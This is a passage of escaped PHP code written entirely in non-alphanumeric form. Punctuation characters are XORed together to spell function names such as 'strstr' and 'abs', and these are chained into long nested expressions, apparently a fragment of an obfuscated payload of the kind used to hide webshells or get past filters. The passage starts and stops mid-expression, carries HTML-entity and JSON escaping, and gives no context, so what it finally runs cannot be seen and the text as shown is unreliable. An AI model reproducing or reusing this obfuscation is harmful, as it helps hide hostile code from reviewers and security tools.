#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;^\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;^\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;))((\u0026#39;(\u0026#39;^\u0026#39;^\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;)))),\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;)),(\u0026#39;^\u0026#39;^\u0026#39;]\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;)))))^((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;.\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;^\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;^\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;))((\u0026#39;(\u0026#39;^\u0026#39;^\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;)))),(\u0026#39;^\u0026#39;^\u0026#39;]\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))))),(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;?\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;:\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;?\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;(\u0026#39;^\u0026#39;^\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))))?((\u0026#39;.\u0026#39;^\u0026#39;^\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;^\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;?\u0026#39;))((\u0026#39;,\u0026#39;^\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;.\u0026#39;^\u0026#39;^\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;.\u0026#39;^\u0026#39;?\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;:\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;)))):((\u0026#39;.\u0026#39;^\u0026#39;^\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;^\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;?\u0026#39;))((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;^\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;]\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;.\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;)\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;.\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;^\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u0026#39;).(\u0026#39;]\u0026#39;^\u0026#39;?\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;))(((\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).(\u0026#39;)\u0026#39;^\u0026#39;]\u0026#39;).(\u0026#39;[\u0026#39;^\u0026#39;)\u0026#39;))(\u0026#39;\u0026#39;,\u0026#39;.\u0026#39;))).(\u0026#39;[\u0026#39;^\u0026#39;(\u0026#39;).\u0026#39;,\u0026#39;.(\u0026#39;[\u0026#39;^\u0026#39;,\u0026#39;^\u0026#39;]\u0026#39;^\u0026#39;:\u0026#39;^\u0026#39;\u0026#39;.((\u0026#39;[\u0026#39;^\u0026#39;:\u